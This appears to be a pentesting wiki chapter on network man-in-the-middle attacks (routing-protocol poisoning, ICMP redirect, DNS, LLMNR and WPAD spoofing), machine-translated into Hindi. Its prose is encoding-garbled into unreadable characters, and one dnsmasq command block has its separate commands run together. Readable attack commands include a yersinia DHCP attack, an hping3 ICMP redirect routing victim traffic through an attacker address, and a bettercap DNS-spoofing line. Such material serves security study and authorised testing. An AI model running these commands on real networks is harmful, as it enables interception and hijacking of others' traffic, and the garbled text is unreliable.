**FHRP** (рдкрд╣рд▓реА рд╣реЙрдк рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐ рдкреНрд░реЛрдЯреЛрдХреЙрд▓) рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдПрдХ рд╡рд░реНрдЧ рд╣реИ рдЬреЛ **рдПрдХ рдЧрд░реНрдо рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐ рдорд╛рд░реНрдЧ рдкреНрд░рдгрд╛рд▓реА рдмрдирд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред FHRP рдХреЗ рд╕рд╛рде, рднреМрддрд┐рдХ рд░рд╛рдЙрдЯрд░реЛрдВ рдХреЛ рдПрдХ рд╣реА рддрд╛рд░реНрдХрд┐рдХ рдЙрдкрдХрд░рдг рдореЗрдВ рдорд┐рд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рддреНрд░реБрдЯрд┐ рд╕рд╣рдирд╢реАрд▓рддрд╛ рдХреЛ рдмрдврд╝рд╛рддрд╛ рд╣реИ рдФрд░ рднрд╛рд░ рдХреЛ рд╡рд┐рддрд░рд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред

**рд╕рд┐рд╕реНрдХреЛ рд╕рд┐рд╕реНрдЯрдореНрд╕ рдЗрдВрдЬреАрдирд┐рдпрд░реНрд╕ рдиреЗ рджреЛ FHRP рдкреНрд░реЛрдЯреЛрдХреЙрд▓, GLBP рдФрд░ HSRP, рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдП рд╣реИрдВред**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

рд░реВрдЯрд┐рдВрдЧ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (RIP) рдХреЗ рддреАрди рд╕рдВрд╕реНрдХрд░рдг рдореМрдЬреВрдж рд╣реИрдВ - RIP, RIPv2 рдФрд░ RIPngред RIP рдФрд░ RIPv2 UDP рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреЛрд░реНрдЯ 520 рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреАрдпрд░реНрд╕ рдХреЛ рднреЗрдЬрддреЗ рд╣реИрдВ, рдЬрдмрдХрд┐ RIPng IPv6 рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ UDP рдкреЛрд░реНрдЯ 521 рдкрд░ рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред RIPv2 рдиреЗ MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдорд░реНрдерди рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ред RIPng рдореЗрдВ рдореВрд▓рднреВрдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реИ; рдмрд▓реНрдХрд┐ рдпрд╣ IPv6 рдХреЗ рднреАрддрд░ рд╡реИрдХрд▓реНрдкрд┐рдХ IPsec AH рдФрд░ ESP рд╣реИрдбрд░ рдкрд░ рдЖрд╢реНрд░рд┐рдд рд╣реЛрддрд╛ рд╣реИред

рдЗрд╕ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдХрд┐рддрд╛рдм _**Network Security Assessment: Know Your Network (3rd edition)**_ рдореЗрдВ рдЬрд╛рдПрдВред

### EIGRP рд╣рдорд▓реЗ

**EIGRP (Enhanced Interior Gateway Routing Protocol)** рдПрдХ рдЧрддрд┐рд╢реАрд▓ рд░реВрдЯрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИред **рдпрд╣ рдПрдХ рджреВрд░реА-рд╡реЗрдХреНрдЯрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИред** рдпрджрд┐ **рдХреЛрдИ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдирд╣реАрдВ** рд╣реИ рдФрд░ рдкреИрд╢рд┐рд╡ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдирд╣реАрдВ рд╣реИ, рддреЛ **рдПрдХ рдЕрддрд┐рдЪрд╛рд░реА** EIGRP рд░реВрдЯрд┐рдВрдЧ рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд░реВрдЯрд┐рдВрдЧ рддрд╛рд▓рд┐рдХрд╛рдПрдВ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ** рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, EIGRP рдиреЗрдЯрд╡рд░реНрдХ (рдЕрдиреНрдп рд╢рдмреНрджреЛрдВ рдореЗрдВ, рд╕реНрд╡рддрдВрддреНрд░ рдкреНрд░рдгрд╛рд▓реА) **рд╕рдорддрд▓ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдХрд┐рд╕реА рднреА рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд╡рд┐рднрд╛рдЬрди рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**ред рдпрджрд┐ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░ рд░реВрдЯ** рдбрд╛рд▓рддрд╛ рд╣реИ, рддреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ рдпрд╣ рд░реВрдЯ рд╕реНрд╡рддрдВрддреНрд░ EIGRP рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ **рдлреИрд▓ рдЬрд╛рдПрдЧрд╛**ред

EIGRP рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдПрдХ рд╡рд┐рдзрд┐рд╡рдд EIGRP рд░реВрдЯрд░ рдХреЗ рд╕рд╛рде рдПрдХ рдкрдбрд╝реЛрд╕ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛** рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рд╕реВрд╕реА рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рд╕рдВрднрд╛рд╡рдирд╛рдУрдВ рддрдХ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

\*\*\*\*[**FRRouting**](https://frrouting.org/) рдЖрдкрдХреЛ BGP, OSPF, EIGRP, RIP рдФрд░ рдЕрдиреНрдп рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕рдорд░реНрдерд┐рдд **рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рд░рд╛рдЙрдЯрд░ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред** рдЖрдкрдХреЛ рдмрд╕ рдЗрд╕реЗ рдЕрдкрдиреЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдбрд┐рдкреНрд▓реЙрдп рдХрд░рдирд╛ рд╣реИ рдФрд░ рдЖрдк рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд░реВрдЯрд┐рдВрдЧ рдбреЛрдореЗрди рдореЗрдВ рдПрдХ рд╡реИрдз рд░рд╛рдЙрдЯрд░ рдХреА рддрд░рд╣ рдмрди рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) рднреА EIGRP рдкреНрд░рд╕рд╛рд░рдг рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдФрд░ рд░реВрдЯрд┐рдВрдЧ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдорд╛рдирд┐рдкреБрд░реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреИрдХреЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕реЗ Coly рдХреЗ рд╕рд╛рде рдХреИрд╕реЗ рд╣рдорд▓рд╛ рдХрд░реЗрдВ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП _**Network Security Assessment: Know Your Network (3rd edition)**_ рджреЗрдЦреЗрдВред

### OSPF

рдЕрдзрд┐рдХрд╛рдВрд╢ рдУрдкрди рд╢реЙрд░реНрдЯреЗрд╕реНрдЯ рдкрд╛рде рдлрд░реНрд╕реНрдЯ (OSPF) рдХреЗ рдЕрдорд▓ рдореЗрдВ MD5 рдХрд╛ рдЙрдкрдпреЛрдЧ рд░рд╛рдЙрдЯрд░реЛрдВ рдХреЗ рдмреАрдЪ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред Loki рдФрд░ John the Ripper MD5 рд╣реИрд╢ рдХреЛ рдХреИрдкреНрдЪрд░ рдФрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдХреБрдВрдЬреА рдкреНрд░рдХрдЯ рд╣реЛ рд╕рдХреЗ, рдЬрд┐рд╕реЗ рдлрд┐рд░ рдирдИ рд░реВрдЯрд┐рдВрдЧ рдХреЛ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд░реВрдЯ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЛ _рдЗрдВрдЬреЗрдХреНрд╢рди_ рдЯреИрдм рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдХреБрдВрдЬреА _рдХрдиреЗрдХреНрд╢рди_ рдХреЗ рддрд╣рдд рд╕реЗрдЯ рдХреА рдЬрд╛рддреА рд╣реИред

рдЗрд╕ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдХрд┐рддрд╛рдм _**Network Security Assessment: Know Your Network (3rd edition)**_ рдореЗрдВ рдЬрд╛рдПрдВред

### рдЕрдиреНрдп рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдХрд░рдг рдФрд░ рд╕реНрд░реЛрдд

* [**Above**](https://github.com/c4s73r/Above): рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рд╕реНрдХреИрди рдХрд░рдиреЗ рдФрд░ рд╕рдВрдХрдЯрд╕реНрдерд▓ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг
* рдиреЗрдЯрд╡рд░реНрдХ рд╣рдорд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдВ [рдкрд╛рдПрдВ](https://github.com/Sab0tag3d/MITM-cheatsheet)ред _(TODO: рдЗрд╕реЗ рдкреВрд░рд╛ рдкрдврд╝реЗрдВ рдФрд░ рдпрджрд┐ рдХреЛрдИ рдирдпрд╛ рд╣рдорд▓рд╛ рд╣реЛ рддреЛ рд╕рднреА рдирдП рд╣рдорд▓реЛрдВ рдХреЛ рдкрдврд╝реЗрдВ)_
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP рд╕реНрдкреВрдлрд┐рдВрдЧ

[рдкрд┐рдЫрд▓реЗ рдЦрдВрдб](./#arp-spoofing) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

### ICMPRedirect

ICMP рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдореЗрдВ ICMP рдкреИрдХреЗрдЯ рдкреНрд░рдХрд╛рд░ 1 рдХреЛрдб 5 рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЖрдИрдкреА рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИред рдлрд┐рд░, рдЬрдм рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ рдЖрдИрдкреА рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рд╡рд╣ рдкреИрдХреЗрдЯ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗрдЧрд╛ред
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS рд╕реНрдкреВрдлрд┐рдВрдЧ

рд╣рдорд▓рд╛рд╡рд░ рд╡реНрдпрдХреНрддрд┐ рджреНрд╡рд╛рд░рд╛ рдкреВрдЫреЗ рдЧрдП рдХреБрдЫ (рдпрд╛ рд╕рднреА) рдбреЛрдореЗрди рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдЧрд╛ред
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**рдЕрдкрдиреЗ DNS рдХреЛ dnsmasq рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ**

рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд▓рд┐рдП рдЕрдкрдирд╛ DNS рд╕реЗрдЯрдЕрдк рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ dnsmasq рдПрдХ рдЙрдкрдпреБрдХреНрдд рд╡рд┐рдХрд▓реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИред dnsmasq рдПрдХ рдЫреЛрдЯрд╛, рдЖрд╕рд╛рди рдФрд░ рд▓рдЪреАрд▓рд╛ DNS рдФрд░ DHCP рд╕рд░реНрд╡рд░ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдк рдЕрдкрдиреЗ рд▓реЛрдХрд▓ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЖрдк рдЕрдкрдиреЗ DNS рд░рд┐рдХреНрддрд┐рдпреЛрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡рд┐рд╢реЗрд╖ рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдЕрдиреБрднрд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ рдХрд┐ рдХреИрд╕реЗ рдЖрдк dnsmasq рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

1. **dnsmasq рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ**: рдЕрдкрдиреЗ рд▓рд┐рдирдХреНрд╕ рдорд╢реАрди рдкрд░ dnsmasq рдкреИрдХреЗрдЬ рдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВред рдЖрдк рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
   ```
   sudo apt-get install dnsmasq
   ```

2. **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдмрджрд▓реЗрдВ**: dnsmasq рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ (`/etc/dnsmasq.conf`) рдХреЛ рдЦреЛрд▓реЗрдВ рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд▓рд╛рдЗрдиреЛрдВ рдХреЛ рдЬреЛрдбрд╝реЗрдВ:
   ```
   address=/example.com/192.168.1.100
   address=/subdomain.example.com/192.168.1.101
   ```

   рдпрд╣рд╛рдВ, `example.com` рдФрд░ `subdomain.example.com` рдЖрдкрдХреЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ DNS рд░рд┐рдХреНрддрд┐рдпрд╛рдБ рд╣реИрдВ, рдФрд░ `192.168.1.100` рдФрд░ `192.168.1.101` рдЙрди рд░рд┐рдХреНрддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ IP рдкрддреЗ рд╣реИрдВред

3. **dnsmasq рд╕реЗрд╡рд╛ рд░реАрд╕реНрдЯрд╛рд░реНрдЯ рдХрд░реЗрдВ**: рдЖрдкрдХреЗ рдмрджрд▓рд╛рд╡реЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡реА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП dnsmasq рд╕реЗрд╡рд╛ рдХреЛ рд░реАрд╕реНрдЯрд╛рд░реНрдЯ рдХрд░реЗрдВред рдЖрдк рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
   ```
   sudo systemctl restart dnsmasq
   ```

рдЗрд╕рдХреЗ рдмрд╛рдж, рдЬрдм рдЖрдкрдХреЗ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ `example.com` рдпрд╛ `subdomain.example.com` рдкрд░ DNS рдкреНрд░рд╢реНрди рдкреВрдЫрд╛ рдЬрд╛рддрд╛ рд╣реИ, dnsmasq рдЙрдиреНрд╣реЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ IP рдкрддреЛрдВ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░реЗрдЧрд╛ред
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### рд╕реНрдерд╛рдиреАрдп рдЧреЗрдЯрд╡реЗ

рдЕрдХреНрд╕рд░ рд╕рд┐рд╕реНрдЯрдо рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд▓рд┐рдП рдХрдИ рд░реВрдЯреНрд╕ рдореМрдЬреВрдж рд╣реЛрддреЗ рд╣реИрдВред рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдореИрдХ рдкрддреЗ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рдж, _gateway-finder.py_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ IPv4 рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣реЛрд╕реНрдЯ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВред
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [LLMNR, NBT-NS рдФрд░ mDNS рдХрд╛ рд╕реНрдкреВрдлрд┐рдВрдЧ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рд╕рд┐рд╕реНрдЯрдо DNS рд▓реБрдХрдЕрдк рд╡рд┐рдлрд▓ рд╣реЛрдиреЗ рдкрд░ рд╕реНрдерд╛рдиреАрдп рд╣реЛрд╕реНрдЯ рд╕рдВрдХреЗрддрдХ рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ-рд▓реЛрдХрд▓ рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ рдирд╛рдо рд╕рдВрдХреЗрддрдХ (LLMNR) рдФрд░ рдиреЗрдЯрдмрд╛рдпреЛрд╕ рдирд╛рдо рд╕реЗрд╡рд╛ (NBT-NS) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред Apple Bonjour рдФрд░ Linux zero-configuration рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕рд┐рд╕реНрдЯрдо рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ DNS (mDNS) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдпреЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЕрдереЗрдВрдЯрд┐рдХреЗрдЯ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ UDP рдкрд░ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рд╕рдВрджреЗрд╢ рднреЗрдЬрддреЗ рд╣реИрдВ; рдЗрд╕рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рдЙрдиреНрд╣реЗрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджреБрд╖реНрдкреНрд░рднрд╛рд╡рд┐рдд рд╕реЗрд╡рд╛рдУрдВ рдкрд░ рдкреНрд░реЗрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк Responder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЭреВрдареЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬрдХрд░ рд╣реЛрд╕реНрдЯ рджреНрд╡рд╛рд░рд╛ рдЦреЛрдЬреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрд╣рд╛рдВ [Responder рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХреИрд╕реЗ рдХрд░реЗрдВ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝реЗрдВред

### [WPAD рдХрд╛ рд╕реНрдкреВрдлрд┐рдВрдЧ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

рдХрдИ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реЗрдм рдкреНрд░реЙрдХреНрд╕реА рдСрдЯреЛ-рдбрд┐рд╕реНрдХрд╡рд░реА (WPAD) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред WPAD рд╕рд░реНрд╡рд░ рдПрдХ рд╡рд┐рд╢реЗрд╖ URL (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, [http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрдм рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ:

* DHCP, рдХреЛрдб 252 рдПрдВрдЯреНрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, рд╕реНрдерд╛рдиреАрдп рдбреЛрдореЗрди рдореЗрдВ _wpad_ рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреА рдЦреЛрдЬ
* рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ LLMNR рдФрд░ NBT-NS (DNS рдЦреЛрдЬ рд╡рд┐рдлрд▓рддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ)

